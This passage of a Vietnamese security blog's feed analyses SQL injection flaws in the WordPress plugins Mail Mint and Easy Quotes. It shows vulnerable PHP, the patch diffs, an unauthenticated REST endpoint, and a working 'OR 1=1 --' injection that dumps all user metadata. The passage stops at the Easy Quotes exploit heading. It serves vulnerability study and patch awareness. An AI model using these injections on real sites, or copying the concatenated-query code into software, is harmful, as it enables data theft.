&lt;code&gt;$params&lt;/code&gt;.&lt;/li&gt;&#xA;&lt;li&gt;&lt;code&gt;retrieve_contacts_associated_with_learndash()&lt;/code&gt; g·ªçi &lt;code&gt;get_wp_users_by_learndash_with_limit_offset($courses, $number = 5, $offset = 0)&lt;/code&gt;:&lt;/li&gt;&#xA;&lt;/ol&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&lt;code&gt;$courses&lt;/code&gt; = &lt;code&gt;$params[&#39;selectedCourses&#39;]&lt;/code&gt;, &lt;code&gt;$number&lt;/code&gt; = &lt;code&gt;5&lt;/code&gt;&lt;/li&gt;&#xA;&lt;li&gt;&lt;code&gt;$keys&lt;/code&gt; l√† m·ªôt m·∫£ng ƒë∆∞·ª£c t·∫°o ra b·∫±ng c√°ch l·∫•y t·∫•t c·∫£ gi√° tr·ªã &lt;code&gt;value&lt;/code&gt; trong &lt;code&gt;$courses&lt;/code&gt;, sau ƒë√≥ gh√©p chu·ªói theo m·∫´u &lt;code&gt;course_{COURSE_ID}_access_from&lt;/code&gt;&lt;/li&gt;&#xA;&lt;li&gt;Tr∆∞·ªõc khi ƒë∆∞a v√†o c√¢u query, m·∫£ng &lt;code&gt;$keys&lt;/code&gt; ƒë∆∞·ª£c n·ªëi th√†nh m·ªôt chu·ªói b·∫±ng h√†m &lt;code&gt;implode()&lt;/code&gt;. N·∫øu &lt;code&gt;$keys&lt;/code&gt; ch·ªâ c√≥ m·ªôt ph·∫ßn t·ª≠, k·∫øt qu·∫£ c·ªßa &lt;code&gt;implode()&lt;/code&gt; ch√≠nh l√† gi√° tr·ªã chu·ªói c·ªßa ph·∫ßn t·ª≠ ƒë√≥.&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;ol start=&#34;5&#34;&gt;&#xA;&lt;li&gt;Th·ª±c thi query, tr·∫£ v·ªÅ JSON ch·ª©a &lt;code&gt;formatted_users&lt;/code&gt; + &lt;code&gt;total_users&lt;/code&gt;&lt;/li&gt;&#xA;&lt;/ol&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;exploit&#34;&gt;&lt;span&gt;Exploit&lt;/span&gt;&#xA;  &lt;a href=&#34;#exploit&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;Sau khi ph√¢n t√≠ch, ta th·∫•y tham s·ªë &lt;code&gt;selectedCourses&lt;/code&gt; ƒë∆∞·ª£c x·ª≠ l√Ω qua nhi·ªÅu logic tr∆∞·ªõc khi truy·ªÅn v√†o query ch·ª©a SQLi, quan tr·ªçng ta v·∫´n ki·ªÉm so√°t ƒë∆∞·ª£c gi√° tr·ªã c·ªßa key &lt;code&gt;value&lt;/code&gt;.&lt;/p&gt;&#xA;&lt;p&gt;&lt;strong&gt;POST request qua BurpSuite&lt;/strong&gt;:&#xA;Ta g·ª≠i request v·ªõi m·ªôt key duy nh·∫•t =&amp;gt; d·ªÖ d√†ng ki·ªÉm so√°t c√¢u query.&lt;/p&gt;&#xA;&lt;figure&gt;&lt;img src=&#34;http://localhost:1313/posts/2025-09-25-cve-2025-58604/request_success.png&#34;&#xA;    alt=&#34;Get all user info&#34;&gt;&lt;figcaption&gt;&#xA;      &lt;p&gt;Get all user info&lt;/p&gt;&#xA;    &lt;/figcaption&gt;&#xA;&lt;/figure&gt;&#xA;&#xA;&lt;p&gt;Khi ƒë√≥, c√¢u query tr·ªü th√†nh:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;SELECT user_id &#xA;FROM wp_usermeta &#xA;WHERE meta_key IN (&amp;#39;course_abc&amp;#39;) OR 1=1 -- _access_from&amp;#39;) GROUP BY user_id LIMIT 5 OFFSET 0&lt;/code&gt;&lt;/pre&gt;&lt;ul&gt;&#xA;&lt;li&gt;&lt;code&gt;&#39;)&lt;/code&gt; tho√°t kh·ªèi &lt;code&gt;IN&lt;/code&gt;&lt;/li&gt;&#xA;&lt;li&gt;&lt;code&gt;1=1&lt;/code&gt; lu√¥n ƒë√∫ng =&amp;gt; tr·∫£ v·ªÅ t·∫•t c·∫£ &lt;code&gt;user_id&lt;/code&gt; trong &lt;code&gt;wp_usermeta&lt;/code&gt;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;p&gt;ƒêo·∫°n code c√≤n l·∫°i trong &lt;code&gt;get_wp_users_by_learndash_with_limit_offset&lt;/code&gt; s·∫Ω truy v·∫•n meta th√¥ng tin c·ªßa t·∫•t c·∫£ user tr·∫£ v·ªÅ:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;$formatted_users = array_map(&#xA;    function ($user) {&#xA;        $user-&amp;gt;usermeta = array_map(&#xA;            function ($user_data) {&#xA;                return reset($user_data);&#xA;            },&#xA;            get_user_meta($user-&amp;gt;ID)&#xA;        );&#xA;        return $user;&#xA;    },&#xA;    $contacts&#xA;);&lt;/code&gt;&lt;/pre&gt;&lt;h2 class=&#34;heading-element&#34; id=&#34;conclusion&#34;&gt;&lt;span&gt;Conclusion&lt;/span&gt;&#xA;  &lt;a href=&#34;#conclusion&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;L·ªó h·ªïng &lt;strong&gt;CVE-2025-58604&lt;/strong&gt; trong plugin WordPress &lt;strong&gt;Mail Mint&lt;/strong&gt; tr∆∞·ªõc phi√™n b·∫£n &lt;strong&gt;1.18.6&lt;/strong&gt; xu·∫•t ph√°t t·ª´ vi·ªác kh√¥ng s·ª≠ d·ª•ng c∆° ch·∫ø chu·∫©n b·ªã truy v·∫•n &lt;code&gt;($wpdb-&amp;gt;prepare)&lt;/code&gt; m√† truy·ªÅn tr·ª±c ti·∫øp d·ªØ li·ªáu t·ª´ ng∆∞·ªùi d√πng v√†o c√¢u l·ªánh SQL d·∫´n ƒë·∫øn l·ªó h·ªïng SQL Injection.&lt;/p&gt;&#xA;&lt;p&gt;B·∫£n v√° ch√≠nh th·ª©c ƒë√£ thay th·∫ø vi·ªác n·ªëi chu·ªói b·∫±ng c√°ch d√πng &lt;code&gt;$wpdb-&amp;gt;prepare&lt;/code&gt;, gi√∫p ƒë·∫£m b·∫£o d·ªØ li·ªáu ƒë·∫ßu v√†o ƒë∆∞·ª£c ki·ªÉm so√°t v√† an to√†n h∆°n.&lt;/p&gt;&#xA;&lt;p&gt;&lt;strong&gt;Key takeaways&lt;/strong&gt;:&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;Lu√¥n s·ª≠ d·ª•ng &lt;code&gt;$wpdb-&amp;gt;prepare()&lt;/code&gt; khi l√†m vi·ªác v·ªõi database trong WordPress ƒë·ªÉ tr√°nh SQL Injection.&lt;/li&gt;&#xA;&lt;li&gt;Th∆∞·ªùng xuy√™n c·∫≠p nh·∫≠t plugin v√† ki·ªÉm tra b·∫£o m·∫≠t ƒë·ªÉ tr√°nh tr·ªü th√†nh m·ª•c ti√™u t·∫•n c√¥ng.&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;references&#34;&gt;&lt;span&gt;References&lt;/span&gt;&#xA;  &lt;a href=&#34;#references&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;&lt;a href=&#34;https://portswigger.net/web-security/sql-injection/cheat-sheet&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;SQL Injection cheat sheet - PortSwigger&lt;/a&gt;&lt;/p&gt;&#xA;&lt;p&gt;&lt;a href=&#34;https://patchstack.com/database/wordpress/plugin/mail-mint/vulnerability/wordpress-mail-mint-plugin-1-18-5-sql-injection-vulnerability&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;WordPress Mail Mint Plugin &amp;lt;= 1.18.5 is vulnerable to SQL Injection&lt;/a&gt;&lt;/p&gt;</description>
    </item>
    <item>
      <title>CVE-2025-26943 Analysis &amp; POC</title>
      <link>http://localhost:1313/vi/posts/2025-09-23-cve-2025-26943/</link>
      <pubDate>Tue, 23 Sep 2025 23:28:00 +0700</pubDate><author>w41bu1@gmail.com (Bui Van Y)</author>
      <guid>http://localhost:1313/vi/posts/2025-09-23-cve-2025-26943/</guid>
      <category domain="http://localhost:1313/vi/categories/cve-analysis/">CVE Analysis</category>
      <description>&lt;img src=&#34;http://localhost:1313/posts/2025-09-23-cve-2025-26943/app.png&#34; alt=&#34;featured image&#34; referrerpolicy=&#34;no-referrer&#34;&gt;&lt;p&gt;L·ªó h·ªïng x·∫£y ra tr√™n plugin &lt;strong&gt;Easy Quotes&lt;/strong&gt; c·ªßa WordPress tr∆∞·ªõc phi√™n b·∫£n &lt;strong&gt;1.2.3&lt;/strong&gt;. ƒêi·ªÅu n√†y c√≥ th·ªÉ cho ph√©p k·∫ª t·∫•n c√¥ng tr·ª±c ti·∫øp t∆∞∆°ng t√°c v·ªõi c∆° s·ªü d·ªØ li·ªáu c·ªßa b·∫°n, bao g·ªìm kh√¥ng gi·ªõi h·∫°n ·ªü vi·ªác ƒë√°nh c·∫Øp th√¥ng tin.&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&lt;strong&gt;CVE ID&lt;/strong&gt;: &lt;a href=&#34;https://www.cve.org/CVERecord?id=CVE-2025-26943&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;CVE-2025-26943&lt;/a&gt;&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Product&lt;/strong&gt;: &lt;a href=&#34;https://wordpress.org/plugins/easy-quotes/#description&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;WordPress Easy Quotes Plugin&lt;/a&gt;&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Vulnerability Type&lt;/strong&gt;: SQL Injection&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Affected Versions&lt;/strong&gt;: &amp;lt;= 1.2.2&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;CVSS severity&lt;/strong&gt;: High (9.3)&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Required Privilege&lt;/strong&gt;: Unauthenticated&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;requirements&#34;&gt;&lt;span&gt;Requirements&lt;/span&gt;&#xA;  &lt;a href=&#34;#requirements&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;ul&gt;&#xA;&lt;li&gt;&lt;strong&gt;Local WordPress &amp;amp; Debugging&lt;/strong&gt;: &lt;a href=&#34;https://w41bu1.github.io/2025-08-21-wordpress-local-and-debugging/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;Local WordPress and Debugging&lt;/a&gt;.&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Taskbuilder Plugin&lt;/strong&gt;:  v1.2.2(vul) v√† v1.2.3(fix)&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;diff tool&lt;/strong&gt;: &lt;strong&gt;meld&lt;/strong&gt; ho·∫∑c b·∫•t c·ª© tool n√†o c√≥ th·ªÉ compare ƒë·ªÉ th·∫•y ƒë∆∞·ª£c s·ª± kh√°c bi·ªát gi·ªØa 2 version&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;analysis&#34;&gt;&lt;span&gt;Analysis&lt;/span&gt;&#xA;  &lt;a href=&#34;#analysis&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;·ª®ng d·ª•ng ƒë√£ ƒë∆∞a tr·ª±c ti·∫øp d·ªØ li·ªáu t·ª´ ng∆∞·ªùi d√πng v√†o c√¢u query SQL m√† &lt;strong&gt;kh√¥ng s·ª≠ d·ª•ng c√°c bi·ªán ph√°p b·∫£o v·ªá&lt;/strong&gt; khi·∫øn l·ªó h·ªïng SQL Injection x·∫£y ra.&lt;/p&gt;&#xA;&lt;h3 class=&#34;heading-element&#34; id=&#34;patch-diff&#34;&gt;&lt;span&gt;Patch Diff&lt;/span&gt;&#xA;  &lt;a href=&#34;#patch-diff&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h3&gt;&lt;p&gt;D√πng diff tool b·∫•t k√¨ ƒë·ªÉ so s√°nh s·ª± kh√°c bi·ªát gi·ªØa b·∫£n l·ªói v√† b·∫£n v√°.&#xA;C√≥ s·ª± kh√°c bi·ªát r√µ ·ªü file &lt;strong&gt;includes/quotes-data.php&lt;/strong&gt;&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;private static function get_family_data($family) {&#xA;    /** @var wpdb $wpdb */&#xA;    global $wpdb;&#xA;    $tablename = $wpdb-&amp;gt;prefix . &amp;#39;easy-quotes-families&amp;#39;;&#xA;    return $wpdb-&amp;gt;get_row(&amp;#34;SELECT * FROM `&amp;#34;.$tablename.&amp;#34;` WHERE `family`=&amp;#39;&amp;#34;.$family.&amp;#34;&amp;#39;;&amp;#34;);&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;B·∫£n v√° s·ª≠ d·ª•ng &lt;code&gt;$wpdb-&amp;gt;prepare()&lt;/code&gt; thay v√¨ truy·ªÅn tr·ª±c ti·∫øp d·ªØ li·ªáu t·ª´ ng∆∞·ªùi d√πng v√†o c√¢u query.&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;private static function get_family_data($family) {&#xA;    /** @var wpdb $wpdb */&#xA;    global $wpdb;&#xA;    $tablename = $wpdb-&amp;gt;prefix . &amp;#39;easy-quotes-families&amp;#39;;&#xA;    $sql = $wpdb-&amp;gt;prepare(&#xA;        &amp;#34;SELECT * FROM %i WHERE `family` = %s&amp;#34;,&#xA;        $tablename, $family&#xA;    );&#xA;    return $wpdb-&amp;gt;get_row($sql);&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;figure&gt;&lt;img src=&#34;http://localhost:1313/posts/2025-09-23-cve-2025-26943/patch_dif.png&#34;&#xA;    alt=&#34;Patch diff&#34;&gt;&lt;figcaption&gt;&#xA;      &lt;p&gt;Patch diff&lt;/p&gt;&#xA;    &lt;/figcaption&gt;&#xA;&lt;/figure&gt;&#xA;&#xA;&lt;p&gt;C√≥ nhi·ªÅu h√†m c≈©ng ƒë∆∞·ª£c v√° b·∫±ng c√°ch tr√™n, nh∆∞: &lt;code&gt;get_font_variant($family_id, $variant_id)&lt;/code&gt;, &lt;code&gt;get_font_variants($family)&lt;/code&gt;, &lt;code&gt;get_fonts($category = -1)&lt;/code&gt;&lt;/p&gt;&#xA;&lt;p&gt;Tuy &lt;code&gt;get_fonts_categories()&lt;/code&gt; ƒë√£ ƒë∆∞·ª£c v√° nh∆∞ng n√≥ kh√¥ng ch·ª©a d·ªØ li·ªáu t·ª´ ng∆∞·ªùi d√πng, n√™n kh√¥ng c·∫ßn quan t√¢m&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;public static function get_fonts_categories() {&#xA;    /** @var wpdb $wpdb */&#xA;    global $wpdb;&#xA;    $tablename = $wpdb-&amp;gt;prefix . &amp;#39;easy-quotes-categories&amp;#39;;&#xA;    $sql = $wpdb-&amp;gt;prepare(&#xA;        &amp;#34;SELECT `category_id`, `category` FROM %i&amp;#34;,&#xA;        $tablename&#xA;    );&#xA;    return $wpdb-&amp;gt;get_results($sql);&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;h3 class=&#34;heading-element&#34; id=&#34;how-it-work&#34;&gt;&lt;span&gt;How it work?&lt;/span&gt;&#xA;  &lt;a href=&#34;#how-it-work&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h3&gt;&lt;p&gt;Ta khai th√°c l·ªói SQL Injection trong h√†m &lt;code&gt;get_family_data($family)&lt;/code&gt;, c√°c h√†m c√≤n l·∫°i khai th√°c t∆∞∆°ng t·ª±.&lt;/p&gt;&#xA;&lt;p&gt;&lt;code&gt;get_family_data()&lt;/code&gt; l√† h√†m public trong class &lt;code&gt;Quotes_Data&lt;/code&gt;&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;class Quotes_Data&#xA;{&#xA;&#x9;function __construct()&#xA;&#x9;{&#xA;&#x9;&#x9;add_filter(&amp;#39;posts_where&amp;#39;, array($this, &amp;#39;posts_where&amp;#39;), 10, 2);&#xA;&#x9;}&#xA;&#xA;    // other function&#xA;&#xA;&#x9;public static function get_font_variants($family) {&#xA;&#x9;&#x9;$familyData = self::get_family_data($family);&#xA;        // other logic&#xA;&#x9;}&#xA;&#xA;&#x9;public static function get_family($family, $variant_id) {&#xA;&#x9;&#x9;$family_data = (array)self::get_family_data($family);&#xA;        // other logic&#xA;&#x9;}&#xA;&#xA;&#x9;private static function get_family_data($family) {&#xA;&#x9;&#x9;/** @var wpdb $wpdb */&#xA;&#x9;&#x9;global $wpdb;&#xA;&#x9;&#x9;$tablename = $wpdb-&amp;gt;prefix . &amp;#39;easy-quotes-families&amp;#39;;&#xA;&#x9;&#x9;return $wpdb-&amp;gt;get_row(&amp;#34;SELECT * FROM `&amp;#34;.$tablename.&amp;#34;` WHERE `family`=&amp;#39;&amp;#34;.$family.&amp;#34;&amp;#39;;&amp;#34;);&#xA;&#x9;}&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;code&gt;get_family_data()&lt;/code&gt; ƒë∆∞·ª£c g·ªçi trong 2 h√†m &lt;code&gt;get_family()&lt;/code&gt; v√† &lt;code&gt;get_font_variants()&lt;/code&gt; c·ªßa class &lt;code&gt;Quotes_Data&lt;/code&gt;, ƒë·ªÉ bi·∫øt ch√∫ng s·ª≠ d·ª•ng ·ªü ƒë√¢u, ta t√¨m ki·∫øn v·ªõi t·ª´ kh√≥a &lt;code&gt;get_family&lt;/code&gt; ho·∫∑c &lt;code&gt;get_font_variants&lt;/code&gt;&lt;/p&gt;&#xA;&lt;figure&gt;&lt;img src=&#34;http://localhost:1313/posts/2025-09-23-cve-2025-26943/search_func.png&#34;&#xA;    alt=&#34;Search function&#34;&gt;&lt;figcaption&gt;&#xA;      &lt;p&gt;Search function&lt;/p&gt;&#xA;    &lt;/figcaption&gt;&#xA;&lt;/figure&gt;&#xA;&#xA;&lt;p&gt;H√†m &lt;code&gt;get_font_variants()&lt;/code&gt; ƒë∆∞·ª£c g·ªçi trong h√†m &lt;code&gt;rest_route_callback_font_variants()&lt;/code&gt; c·ªßa class &lt;code&gt;Quotes_Rest_Route&lt;/code&gt;&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;class Quotes_Rest_Route&#xA;{&#xA;    function __construct()&#xA;    {&#xA;        add_action(&amp;#39;rest_api_init&amp;#39;, array($this, &amp;#39;rest_api_init&amp;#39;));&#xA;    }&#xA;&#xA;    /**&#xA;     * Register my REST route&#xA;     *&#xA;     * @return void&#xA;     */&#xA;    function rest_api_init($wp_rest_server)&#xA;    {&#xA;        $args = [&#xA;        &amp;#39;method&amp;#39;                =&amp;gt; WP_REST_Server::READABLE,&#xA;        &amp;#39;callback&amp;#39;              =&amp;gt; [$this, &amp;#39;rest_route_callback_quote&amp;#39;],&#xA;        &amp;#39;permission_callback&amp;#39;   =&amp;gt; &amp;#39;__return_true&amp;#39;&#xA;        ];&#xA;        register_rest_route(&amp;#39;layart/v1&amp;#39;, &amp;#39;/quote&amp;#39;, $args);&#xA;&#xA;        // other logic&#xA;&#xA;        $args[&amp;#39;callback&amp;#39;] = [$this, &amp;#39;rest_route_callback_font_variants&amp;#39;];&#xA;        register_rest_route(&amp;#39;layart/v1&amp;#39;, &amp;#39;/font-variants&amp;#39;, $args);&#xA;    }&#xA;&#xA;    // other function&#xA;&#xA;    function rest_route_callback_font_variants(WP_REST_Request $request)&#xA;    {&#xA;        $family = $request-&amp;gt;get_param(&amp;#39;family&amp;#39;);&#xA;        $family = isset($family) ? $family : &amp;#34;Shadows Into Light&amp;#34;;&#xA;&#xA;        $response = Quotes_Data::get_font_variants($family);&#xA;        return rest_ensure_response($response);&#xA;    }&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;H√†m kh·ªüi t·∫°o c·ªßa class &lt;code&gt;Quotes_Rest_Route&lt;/code&gt; s·ª≠ d·ª•ng &lt;code&gt;add_action(hook_name, callback)&lt;/code&gt; v·ªõi &lt;code&gt;hook_name&lt;/code&gt; l√† &lt;code&gt;rest_api_init&lt;/code&gt; ƒë·ªÉ ƒëƒÉng k√Ω c√°c endpoint t√πy ch·ªânh v·ªõi REST API System c·ªßa WordPress&lt;/p&gt;&#xA;&lt;p&gt;Callback &lt;code&gt;rest_api_init&lt;/code&gt; s·ª≠ d·ª•ng &lt;code&gt;register_rest_route&lt;/code&gt; nhi·ªÅu l·∫ßn ƒë·ªÉ t·∫°o c√°c endpoint d∆∞·ªõi namespace &lt;code&gt;layart/v1&lt;/code&gt;&lt;/p&gt;&#xA;&lt;p&gt;&lt;code&gt;rest_route_callback_font_variants&lt;/code&gt; l√† callback c·ªßa endpoint &lt;code&gt;/wp-json/layart/v1/font-variants?family=family_name&lt;/code&gt;&lt;/p&gt;&#xA;&lt;p&gt;&lt;code&gt;$family&lt;/code&gt; m·∫∑c ƒë·ªãnh l√† &lt;code&gt;Shadows Into Light&lt;/code&gt; n·∫øu kh√¥ng ƒë∆∞·ª£c truy·ªÅn trong param.&lt;/p&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;exploit&#34;&gt;&lt;span&gt;Exploit&lt;/span&gt;&#xA;  &lt;a href=&#34;#exploit&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; 